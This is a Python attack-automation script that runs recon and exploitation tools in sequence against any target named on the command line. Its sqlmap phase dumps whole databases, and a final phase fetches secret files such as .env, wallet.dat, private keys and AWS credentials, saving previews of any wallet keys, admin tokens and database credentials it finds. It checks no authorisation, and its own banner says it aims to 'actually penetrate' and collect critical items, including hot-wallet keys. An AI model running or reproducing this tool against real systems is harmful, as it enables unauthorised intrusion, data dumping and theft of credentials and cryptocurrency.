#!/usr/bin/env python3
"""
🚀 MAKV'S ADVANCED PENETRATION ENGINE 🚀
REAL PENETRATION TOOLS INTEGRATION
Built to ACTUALLY PENETRATE and GET THOSE 30 CRITICAL ITEMS
"""

import asyncio
import subprocess
import json
import os
import time
import socket
import ssl
import requests
from urllib.parse import urljoin, urlparse
from datetime import datetime
import tempfile
import shutil
import re

class MakvAdvancedPenetrationEngine:
    def __init__(self):
        self.target = None
        self.results = {
            'critical_vulnerabilities': [],
            'admin_panels': [],
            'config_files': [],
            'api_endpoints': [],
            'open_ports': [],
            'subdomains': [],
            'security_headers': {},
            'ssl_info': {},
            'sql_injections': [],
            'xss_vulnerabilities': [],
            'authentication_bypasses': [],
            'file_uploads': [],
            'directory_traversals': [],
            'command_injections': [],
            'hot_wallet_keys': [],
            'admin_tokens': [],
            'database_credentials': [],
            'smart_contract_keys': [],
            'api_keys': []
        }
        self.tools_available = self._check_tools()
        
    def _check_tools(self):
        """Check which penetration tools are available"""
        tools = {
            'nuclei': self._check_command('nuclei'),
            'sqlmap': self._check_command('sqlmap'),
            'nmap': self._check_command('nmap'),
            'ffuf': self._check_command('ffuf'),
            'gobuster': self._check_command('gobuster'),
            'nikto': self._check_command('nikto'),
            'wpscan': self._check_command('wpscan'),
            'subfinder': self._check_command('subfinder'),
            'httpx': self._check_command('httpx'),
            'amass': self._check_command('amass')
        }
        return tools
    
    def _check_command(self, cmd):
        """Check if a command is available"""
        try:
            subprocess.run([cmd, '--help'], capture_output=True, timeout=5)
            return True
        except:
            return False
    
    async def full_penetration_test(self, target):
        """Run complete advanced penetration test"""
        self.target = target
        print(f"\n💀 MAKV'S ADVANCED PENETRATION INITIATED ON {target}")
        print("🎯 USING REAL PENETRATION TOOLS TO GET CRITICAL ITEMS...")
        
        # Phase 1: Advanced Reconnaissance
        await self.phase1_advanced_reconnaissance()
        
        # Phase 2: Nuclei Vulnerability Scanning
        await self.phase2_nuclei_scanning()
        
        # Phase 3: SQL Injection with SQLMap
        await self.phase3_sqlmap_injection()
        
        # Phase 4: Directory/File Fuzzing
        await self.phase4_advanced_fuzzing()
        
        # Phase 5: Web Application Testing
        await self.phase5_web_app_testing()
        
        # Phase 6: Critical Asset Hunting
        await self.phase6_critical_asset_hunting()
        
        # Phase 7: Generate Advanced Report
        await self.phase7_generate_advanced_report()
        
        print(f"\n🎉 ADVANCED PENETRATION TEST COMPLETED FOR {self.target}")
        return self.results
    
    async def phase1_advanced_reconnaissance(self):
        """Advanced reconnaissance using multiple tools"""
        print(f"\n🔍 PHASE 1: ADVANCED RECONNAISSANCE")
        
        # Subdomain enumeration with multiple tools
        if self.tools_available.get('subfinder'):
            await self._run_subfinder()
        if self.tools_available.get('amass'):
            await self._run_amass()
        
        # Port scanning with Nmap
        if self.tools_available.get('nmap'):
            await self._run_nmap_aggressive()
        
        # HTTP probing
        if self.tools_available.get('httpx'):
            await self._run_httpx()
    
    async def _run_subfinder(self):
        """Run subfinder for subdomain enumeration"""
        try:
            print("🔍 Running Subfinder for subdomain enumeration...")
            cmd = ['subfinder', '-d', self.target, '-silent']
            result = await self._run_command(cmd)
            if result:
                subdomains = result.strip().split('\n')
                self.results['subdomains'].extend([s for s in subdomains if s])
                print(f"✅ Found {len(subdomains)} subdomains with Subfinder")
        except Exception as e:
            print(f"⚠️ Subfinder failed: {e}")
    
    async def _run_amass(self):
        """Run Amass for advanced subdomain enumeration"""
        try:
            print("🔍 Running Amass for advanced subdomain enumeration...")
            cmd = ['amass', 'enum', '-d', self.target, '-silent']
            result = await self._run_command(cmd, timeout=60)
            if result:
                subdomains = result.strip().split('\n')
                self.results['subdomains'].extend([s for s in subdomains if s and s not in self.results['subdomains']])
                print(f"✅ Found additional subdomains with Amass")
        except Exception as e:
            print(f"⚠️ Amass failed: {e}")
    
    async def _run_nmap_aggressive(self):
        """Run aggressive Nmap scan"""
        try:
            print("🔌 Running aggressive Nmap scan...")
            cmd = ['nmap', '-sS', '-sV', '-O', '-A', '--script=vuln', self.target]
            result = await self._run_command(cmd, timeout=300)
            if result:
                # Parse Nmap results for open ports and vulnerabilities
                ports = re.findall(r'(\d+)/tcp\s+open\s+(\w+)', result)
                self.results['open_ports'].extend(ports)
                
                # Look for vulnerabilities in Nmap output
                if 'VULNERABLE' in result:
                    vulns = re.findall(r'(\w+).*VULNERABLE', result)
                    self.results['critical_vulnerabilities'].extend(vulns)
                
                print(f"✅ Nmap found {len(ports)} open ports and potential vulnerabilities")
        except Exception as e:
            print(f"⚠️ Nmap failed: {e}")
    
    async def _run_httpx(self):
        """Run httpx for HTTP probing"""
        try:
            print("🌐 Running httpx for HTTP probing...")
            targets = [self.target] + self.results['subdomains']
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write('\n'.join(targets))
                temp_file = f.name
            
            cmd = ['httpx', '-l', temp_file, '-silent', '-title', '-tech-detect', '-status-code']
            result = await self._run_command(cmd)
            if result:
                lines = result.strip().split('\n')
                for line in lines:
                    if '[200]' in line or '[301]' in line or '[302]' in line:
                        self.results['api_endpoints'].append(line)
                print(f"✅ httpx found {len(lines)} live endpoints")
            
            os.unlink(temp_file)
        except Exception as e:
            print(f"⚠️ httpx failed: {e}")
    
    async def phase2_nuclei_scanning(self):
        """Advanced vulnerability scanning with Nuclei"""
        print(f"\n⚡ PHASE 2: NUCLEI VULNERABILITY SCANNING")
        
        if not self.tools_available.get('nuclei'):
            print("⚠️ Nuclei not available, skipping advanced scanning")
            return
        
        try:
            print("🔍 Running Nuclei with all templates...")
            cmd = ['nuclei', '-u', f'https://{self.target}', '-t', '/root/nuclei-templates/', '-silent', '-json']
            result = await self._run_command(cmd, timeout=600)
            
            if result:
                # Parse JSON results
                for line in result.strip().split('\n'):
                    if line.strip():
                        try:
                            vuln = json.loads(line)
                            severity = vuln.get('info', {}).get('severity', 'unknown')
                            if severity in ['critical', 'high']:
                                self.results['critical_vulnerabilities'].append({
                                    'template': vuln.get('template-id'),
                                    'severity': severity,
                                    'url': vuln.get('matched-at'),
                                    'info': vuln.get('info', {})
                                })
                        except json.JSONDecodeError:
                            continue
                
                print(f"✅ Nuclei found {len(self.results['critical_vulnerabilities'])} critical vulnerabilities")
        except Exception as e:
            print(f"⚠️ Nuclei scanning failed: {e}")
    
    async def phase3_sqlmap_injection(self):
        """SQL injection testing with SQLMap"""
        print(f"\n💉 PHASE 3: SQL INJECTION WITH SQLMAP")
        
        if not self.tools_available.get('sqlmap'):
            print("⚠️ SQLMap not available, skipping SQL injection testing")
            return
        
        try:
            # Test common endpoints for SQL injection
            test_urls = [
                f'https://{self.target}/login.php?id=1',
                f'https://{self.target}/search.php?q=test',
                f'https://{self.target}/product.php?id=1',
                f'https://{self.target}/user.php?id=1',
                f'https://{self.target}/api/user?id=1'
            ]
            
            for url in test_urls:
                print(f"🔍 Testing SQL injection on {url}")
                cmd = ['sqlmap', '-u', url, '--batch', '--risk=3', '--level=5', '--dbs', '--dump-all']
                result = await self._run_command(cmd, timeout=300)
                
                if result and 'vulnerable' in result.lower():
                    self.results['sql_injections'].append({
                        'url': url,
                        'vulnerable': True,
                        'details': result
                    })
                    print(f"🚨 SQL INJECTION FOUND: {url}")
                    
                    # Try to extract database information
                    if 'available databases' in result.lower():
                        databases = re.findall(r'available databases.*?:\s*(.*)', result, re.IGNORECASE)
                        if databases:
                            self.results['database_credentials'].append({
                                'url': url,
                                'databases': databases[0]
                            })
        except Exception as e:
            print(f"⚠️ SQLMap failed: {e}")
    
    async def phase4_advanced_fuzzing(self):
        """Advanced directory and file fuzzing"""
        print(f"\n📁 PHASE 4: ADVANCED DIRECTORY/FILE FUZZING")
        
        # Use FFUF if available, otherwise use Gobuster
        if self.tools_available.get('ffuf'):
            await self._run_ffuf()
        elif self.tools_available.get('gobuster'):
            await self._run_gobuster()
    
    async def _run_ffuf(self):
        """Run FFUF for advanced fuzzing"""
        try:
            print("🔍 Running FFUF for advanced fuzzing...")
            
            # Common wordlists (you might need to adjust paths)
            wordlists = [
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
                '/usr/share/seclists/Discovery/Web-Content/common.txt'
            ]
            
            for wordlist in wordlists:
                if os.path.exists(wordlist):
                    cmd = ['ffuf', '-u', f'https://{self.target}/FUZZ', '-w', wordlist, '-mc', '200,301,302,403', '-silent']
                    result = await self._run_command(cmd, timeout=300)
                    
                    if result:
                        lines = result.strip().split('\n')
                        for line in lines:
                            if 'Status:' in line:
                                self.results['admin_panels'].append(line)
                        print(f"✅ FFUF found {len(lines)} directories/files")
                    break
        except Exception as e:
            print(f"⚠️ FFUF failed: {e}")
    
    async def _run_gobuster(self):
        """Run Gobuster for directory enumeration"""
        try:
            print("🔍 Running Gobuster for directory enumeration...")
            cmd = ['gobuster', 'dir', '-u', f'https://{self.target}', '-w', '/usr/share/wordlists/dirb/common.txt', '-q']
            result = await self._run_command(cmd, timeout=300)
            
            if result:
                lines = result.strip().split('\n')
                for line in lines:
                    if '(Status:' in line:
                        self.results['admin_panels'].append(line)
                print(f"✅ Gobuster found {len(lines)} directories")
        except Exception as e:
            print(f"⚠️ Gobuster failed: {e}")
    
    async def phase5_web_app_testing(self):
        """Advanced web application testing"""
        print(f"\n🌐 PHASE 5: WEB APPLICATION TESTING")
        
        if self.tools_available.get('nikto'):
            await self._run_nikto()
        
        if self.tools_available.get('wpscan') and await self._is_wordpress():
            await self._run_wpscan()
    
    async def _run_nikto(self):
        """Run Nikto for web server testing"""
        try:
            print("🔍 Running Nikto for web server testing...")
            cmd = ['nikto', '-h', self.target, '-Format', 'json']
            result = await self._run_command(cmd, timeout=300)
            
            if result:
                try:
                    nikto_data = json.loads(result)
                    vulnerabilities = nikto_data.get('vulnerabilities', [])
                    self.results['critical_vulnerabilities'].extend(vulnerabilities)
                    print(f"✅ Nikto found {len(vulnerabilities)} potential issues")
                except json.JSONDecodeError:
                    # Parse text output if JSON fails
                    lines = result.strip().split('\n')
                    vulns = [line for line in lines if 'OSVDB' in line or 'CVE' in line]
                    self.results['critical_vulnerabilities'].extend(vulns)
                    print(f"✅ Nikto found {len(vulns)} potential issues")
        except Exception as e:
            print(f"⚠️ Nikto failed: {e}")
    
    async def _is_wordpress(self):
        """Check if target is WordPress"""
        try:
            response = requests.get(f'https://{self.target}/wp-admin/', timeout=10, verify=False)
            return 'wp-' in response.text.lower() or response.status_code == 200
        except:
            return False
    
    async def _run_wpscan(self):
        """Run WPScan for WordPress testing"""
        try:
            print("🔍 Running WPScan for WordPress testing...")
            cmd = ['wpscan', '--url', f'https://{self.target}', '--enumerate', 'vp,vt,u', '--format', 'json']
            result = await self._run_command(cmd, timeout=300)
            
            if result:
                try:
                    wp_data = json.loads(result)
                    vulnerabilities = wp_data.get('vulnerabilities', {})
                    for vuln_type, vulns in vulnerabilities.items():
                        self.results['critical_vulnerabilities'].extend(vulns)
                    print(f"✅ WPScan found WordPress vulnerabilities")
                except json.JSONDecodeError:
                    print("⚠️ WPScan output parsing failed")
        except Exception as e:
            print(f"⚠️ WPScan failed: {e}")
    
    async def phase6_critical_asset_hunting(self):
        """Hunt for critical assets like API keys, tokens, etc."""
        print(f"\n👑 PHASE 6: CRITICAL ASSET HUNTING")
        
        # Search for common critical files and endpoints
        critical_paths = [
            '/.env', '/config.php', '/wp-config.php', '/database.yml',
            '/api/keys', '/admin/config', '/backup.sql', '/.git/config',
            '/wallet.dat', '/private.key', '/admin.php', '/phpmyadmin/',
            '/api/v1/admin', '/admin/login', '/management/', '/console/',
            '/.aws/credentials', '/docker-compose.yml', '/Dockerfile'
        ]
        
        for path in critical_paths:
            await self._check_critical_path(path)
    
    async def _check_critical_path(self, path):
        """Check if critical path exists and contains sensitive data"""
        try:
            url = f'https://{self.target}{path}'
            response = requests.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                content = response.text.lower()
                
                # Check for various types of sensitive data
                if any(keyword in content for keyword in ['password', 'secret', 'key', 'token', 'api']):
                    self.results['config_files'].append({
                        'path': path,
                        'status': response.status_code,
                        'sensitive': True,
                        'content_preview': content[:200]
                    })
                    print(f"🚨 CRITICAL FILE FOUND: {url}")
                
                # Check for specific crypto-related content
                if any(keyword in content for keyword in ['wallet', 'private_key', 'mnemonic', 'seed']):
                    self.results['hot_wallet_keys'].append({
                        'path': path,
                        'url': url,
                        'content_preview': content[:200]
                    })
                    print(f"💰 WALLET/KEY FILE FOUND: {url}")
                
                # Check for admin tokens
                if any(keyword in content for keyword in ['admin_token', 'auth_token', 'session_token']):
                    self.results['admin_tokens'].append({
                        'path': path,
                        'url': url,
                        'content_preview': content[:200]
                    })
                    print(f"🔑 ADMIN TOKEN FOUND: {url}")
                    
        except Exception as e:
            pass  # Silent fail for non-existent paths
    
    async def phase7_generate_advanced_report(self):
        """Generate comprehensive penetration test report"""
        print(f"\n📊 PHASE 7: GENERATING ADVANCED REPORT")
        
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'tools_used': [tool for tool, available in self.tools_available.items() if available],
            'critical_findings': [],
            'total_vulnerabilities': 0,
            'results': self.results
        }
        
        # Calculate critical findings
        critical_count = (
            len(self.results['critical_vulnerabilities']) +
            len(self.results['sql_injections']) +
            len(self.results['hot_wallet_keys']) +
            len(self.results['admin_tokens']) +
            len(self.results['database_credentials'])
        )
        
        report['total_vulnerabilities'] = critical_count
        
        # Generate critical findings summary
        if self.results['hot_wallet_keys']:
            report['critical_findings'].append(f"🚨 CRITICAL: {len(self.results['hot_wallet_keys'])} potential wallet/key files found")
        
        if self.results['admin_tokens']:
            report['critical_findings'].append(f"🚨 CRITICAL: {len(self.results['admin_tokens'])} admin tokens found")
        
        if self.results['sql_injections']:
            report['critical_findings'].append(f"🚨 CRITICAL: {len(self.results['sql_injections'])} SQL injection vulnerabilities")
        
        if self.results['database_credentials']:
            report['critical_findings'].append(f"🚨 CRITICAL: Database access possible")
        
        # Save report
        os.makedirs('reports', exist_ok=True)
        report_file = f'reports/advanced_report_{self.target}_{int(time.time())}.json'
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"📊 Advanced report saved: {report_file}")
        print(f"🎯 Total critical findings: {critical_count}")
        
        return report
    
    async def _run_command(self, cmd, timeout=60):
        """Run system command asynchronously"""
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
            return stdout.decode('utf-8', errors='ignore')
        except asyncio.TimeoutError:
            print(f"⚠️ Command timed out: {' '.join(cmd)}")
            return None
        except Exception as e:
            print(f"⚠️ Command failed: {' '.join(cmd)} - {e}")
            return None

# Direct execution support
async def run_advanced_penetration_test(target):
    """Run advanced penetration test"""
    engine = MakvAdvancedPenetrationEngine()
    return await engine.full_penetration_test(target)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target = sys.argv[1]
        asyncio.run(run_advanced_penetration_test(target))
    else:
        print("Usage: python3 advanced_penetration_engine.py <target>")